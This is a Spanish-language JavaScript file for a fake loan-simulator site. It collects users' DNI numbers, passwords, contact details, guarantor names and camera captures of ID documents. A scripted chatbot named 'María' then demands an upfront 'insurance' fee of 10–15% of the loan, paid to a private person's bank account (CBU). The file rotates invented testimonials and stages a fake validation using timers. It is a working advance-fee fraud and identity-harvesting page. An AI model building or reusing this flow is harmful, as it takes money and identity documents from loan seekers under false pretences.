// Manejo del estado global de la simulación
let currentLoanAmount = 100000;
let currentTermMonths = 1;
let activeUserDni = "";

document.addEventListener("DOMContentLoaded", () => {
    // Inicializar el paquete de iconos estéticos Lucide SVG
    if (typeof lucide !== 'undefined') {
        lucide.createIcons();
    }
});

// Enrutador nativo entre secciones
function changeSection(sectionId) {
    document.querySelectorAll('.section-panel').forEach(panel => panel.classList.remove('active'));
    document.getElementById(sectionId).classList.add('active');
}

/* --- MÓDULO DE AUTENTICACIÓN --- */
function switchAuthTab(tabType) {
    const tabs = document.querySelectorAll('.auth-tab');
    const registerForm = document.getElementById('register-form');
    const loginForm = document.getElementById('login-form');

    if (tabType === 'register') {
        tabs[0].classList.add('active');
        tabs[1].classList.remove('active');
        registerForm.style.display = 'block';
        loginForm.style.display = 'none';
    } else {
        tabs[1].classList.add('active');
        tabs[0].classList.remove('active');
        registerForm.style.display = 'none';
        loginForm.style.display = 'block';
    }
}

function handleRegister(event) {
    event.preventDefault();
    const dni = document.getElementById('reg-dni').value;
    const pass = document.getElementById('reg-pass').value;
    const passConfirm = document.getElementById('reg-pass-confirm').value;
    const passwordError = document.getElementById('password-error');

    if (pass !== passConfirm) {
        passwordError.style.display = 'block';
        return;
    }
    passwordError.style.display = 'none';
    activeUserDni = dni;
    
    proceedToDashboard(`¡Hola, DNI ${activeUserDni}!`);
}

function handleLogin(event) {
    event.preventDefault();
    activeUserDni = document.getElementById('login-dni').value;
    proceedToDashboard(`¡Bienvenido de vuelta, ${activeUserDni}!`);
}

function proceedToDashboard(welcomeMessage) {
    document.getElementById('welcome-text').innerText = welcomeMessage;
    changeSection('dashboard-section');
}

/* --- MÓDULO DEL SIMULADOR --- */
function updateSlider(value) {
    currentLoanAmount = parseInt(value);
    document.getElementById('amount-val').innerText = `$${currentLoanAmount.toLocaleString('es-AR')}`;
}

function selectTerm(element, months) {
    document.querySelectorAll('.term-option').forEach(opt => opt.classList.remove('active'));
    element.classList.add('active');
    currentTermMonths = months;
}

/* --- MÓDULO DE INFORMACIÓN DEL PRÉSTAMO --- */
function switchInfoTab(tabType) {
    const tabs = document.querySelectorAll('.info-tab');
    const infoClausulas = document.getElementById('info-clausulas');
    const infoSeguro = document.getElementById('info-seguro');

    if (tabType === 'clausulas') {
        tabs[0].classList.add('active');
        tabs[1].classList.remove('active');
        infoClausulas.classList.add('active');
        infoSeguro.classList.remove('active');
    } else {
        tabs[1].classList.add('active');
        tabs[0].classList.remove('active');
        infoClausulas.classList.remove('active');
        infoSeguro.classList.add('active');
    }
}

/* --- MÓDULO DE FORMULARIO MULTIPASO Y CÁMARA --- */
function processStep1() {
    const name = document.getElementById('form-nombre').value;
    const surname = document.getElementById('form-apellido').value;
    const phone = document.getElementById('form-cel').value;
    const guarantor = document.getElementById('form-garante').value;

    if (!name || !surname || !phone || !guarantor) {
        alert("Por favor, completa todos los campos del Paso 1.");
        return;
    }
    nextStep(2);
}

function nextStep(stepNum) {
    document.querySelectorAll('.step-panel').forEach(panel => panel.classList.remove('active'));
    document.querySelectorAll('.step-indicator').forEach(ind => ind.classList.remove('active'));
    
    document.getElementById(`step-${stepNum}`).classList.add('active');
    for (let i = 1; i <= stepNum; i++) {
        document.getElementById(`ind-${i}`).classList.add('active');
    }
}

async function initCamera(side) {
    const video = document.getElementById(`video-${side}`);
    const img = document.getElementById(`img-${side}`);
    const icon = document.getElementById(`icon-${side}`);
    const text = document.getElementById(`text-${side}`);

    icon.style.display = 'none';
    text.style.display = 'none';
    video.style.display = 'block';

    const facingMode = (side === 'front') ? 'user' : 'environment';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: facingMode } 
        });
        video.srcObject = stream;
        
        // Simulación de captura tras congelamiento de escena (2.5 Segundos)
        setTimeout(() => {
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
            img.style.display = 'block';
            img.src = "https://images.unsplash.com/photo-1554774853-aae0a22c8aa4?w=400&auto=format&fit=crop&q=60"; 
        }, 2500);

    } catch (err) {
        console.warn("Dispositivo de cámara no disponible. Usando respaldo gráfico.");
        video.style.display = 'none';
        img.style.display = 'block';
        img.src = "https://images.unsplash.com/photo-1554774853-aae0a22c8aa4?w=400&auto=format&fit=crop&q=60";
    }
}

function submitLoanApplication() {
    const reason = document.getElementById('loan-reason').value;
    if (!reason) {
        alert("Por favor, ingresá el motivo de tu solicitud.");
        return;
    }
    changeSection('chat-section');
    startBotFlow();
}

/* --- MÓDULO CONVERSACIONAL (BOT MARÍA) --- */
const chatBox = document.getElementById('chat-box');
let testimonialInterval = null;

// Testimonios de usuarios
const testimonios = [
    { nombre: "María G.", texto: "No confiaba mucho al principio, pero el proceso fue muy rápido y el seguro me protegió perfectamente." },
    { nombre: "Juan P.", texto: "Pedir el préstamo fue lo mejor que hice. El seguro del 1% es muy razonable comparado con otros lugares." },
    { nombre: "Sandra L.", texto: "Pensé que iba a ser complicado, pero pagué el seguro y me llegó todo en 24 horas. Muy recomendado." },
    { nombre: "Carlos R.", texto: "El servicio de María fue excelente. Ella me explicó bien todo sobre el seguro y ahora estoy tranquilo." },
    { nombre: "Lucía M.", texto: "Recibí el préstamo sin complicaciones. El seguro me da una tranquilidad total en la transacción." },
    { nombre: "Roberto T.", texto: "Skeptico al inicio, pero todo fue transparente. La mejor decisión que tomé." },
    { nombre: "Patricia S.", texto: "Muy satisfecha con todo. El equipo de María fue muy atento conmigo durante todo el proceso." },
    { nombre: "Francisco D.", texto: "No esperaba un servicio tan profesional. El seguro fue lo que me terminó de convencer." }
];

function postMessage(sender, text, actionHtml = "") {
    const msgDiv = document.createElement('div');
    msgDiv.classList.add('msg', sender);
    msgDiv.innerText = text;
    
    if (actionHtml) {
        const customContent = document.createElement('div');
        customContent.innerHTML = actionHtml;
        msgDiv.appendChild(customContent);
    }
    
    chatBox.appendChild(msgDiv);
    chatBox.scrollTop = chatBox.scrollHeight;
}

function postTestimonial() {
    const testimonial = testimonios[Math.floor(Math.random() * testimonios.length)];
    const testimonialDiv = document.createElement('div');
    testimonialDiv.classList.add('msg', 'bot', 'testimonial');
    testimonialDiv.innerHTML = `<div class="testimonial-name">👤 ${testimonial.nombre}</div><div class="testimonial-text">"${testimonial.texto}"</div>`;
    
    chatBox.appendChild(testimonialDiv);
    chatBox.scrollTop = chatBox.scrollHeight;
}

function startBotFlow() {
    chatBox.innerHTML = ""; 
    
    // Iniciar testimonios cada 5 segundos
    testimonialInterval = setInterval(() => {
        postTestimonial();
    }, 5000);
    
    setTimeout(() => {
        postMessage('bot', '¡Hola! Soy María, tu asistente. ¿Cómo deseas proceder?', `
            <div class="chat-actions">
                <button class="btn" onclick="executeBotRoute('with_income')">Con recibo de sueldo</button>
                <button class="btn btn-secondary" onclick="executeBotRoute('without_income')">Sin recibo de sueldo</button>
            </div>
        `);
    }, 600);
}

function executeBotRoute(route) {
    if (route === 'with_income') {
        postMessage('user', 'Con recibo de sueldo');
        setTimeout(() => {
            postMessage('bot', '¡Genial! Por favor, sube tu recibo de sueldo para procesar tu solicitud.', `
                <label class="file-upload-input">
                    <input type="file" accept="image/*,application/pdf" style="display:none;" onchange="uploadTriggered('recibo')">
                    <i data-lucide="upload-cloud"></i> Seleccionar Archivo (PDF/PNG)
                </label>
            `);
            if (typeof lucide !== 'undefined') lucide.createIcons();
        }, 800);
    } 
    else if (route === 'without_income') {
        postMessage('user', 'Sin recibo de sueldo');
        requestMandatoryInsurance();
    }
    else if (route === 'recibo_uploaded') {
        postMessage('user', 'Recibo de sueldo cargado');
        requestMandatoryInsurance();
    }
}

function requestMandatoryInsurance() {
    const insurancePercentage = currentTermMonths === 1 ? 0.10 : 0.15;
    const calculatePremium = (currentLoanAmount * insurancePercentage).toLocaleString('es-AR');
    const percentageText = currentTermMonths === 1 ? "10%" : "15%";
    
    setTimeout(() => {
        postMessage('bot', `Ahora es necesario que abones un seguro del ${percentageText} del monto solicitado ($${calculatePremium}). Transfiere este monto al siguiente CBU: 0000013000032390398993, a nombre de María Alejandra Picallo. No uses MercadoPago: suele tardar y puede haber errores del sistema. Usa bancos o billeteras virtuales que funcionen bien, luego subí el comprobante.`, `
            <label class="file-upload-input">
                <input type="file" accept="image/*,application/pdf" style="display:none;" onchange="uploadTriggered('comprobante')">
                <i data-lucide="upload-cloud"></i> Subir Comprobante de Transferencia
            </label>
        `);
        if (typeof lucide !== 'undefined') lucide.createIcons();
    }, 800);
}

function uploadTriggered(docType) {
    if (docType === 'recibo') {
        const documentLabel = 'Recibo_Sueldo.pdf';
        postMessage('user', `Documento enviado: ${documentLabel}`);
        
        setTimeout(() => {
            postMessage('bot', `Recibido tu recibo de sueldo. Verificando...`);
            
            setTimeout(() => {
                executeBotRoute('recibo_uploaded');
            }, 1500);
        }, 1000);
    } else if (docType === 'comprobante') {
        const documentLabel = 'Comprobante_Seguro.png';
        postMessage('user', `Documento enviado: ${documentLabel}`);
        
        setTimeout(() => {
            postMessage('bot', `Aguarde 2 minutos mientras verificamos.`);
            
            setTimeout(() => {
                postMessage('bot', '¡Validación completada con éxito! Tu solicitud ha sido procesada de manera correcta en la plataforma. Nos comunicaremos con vos.');
                clearInterval(testimonialInterval);
            }, 2 * 2000);
        }, 1000);
    }
}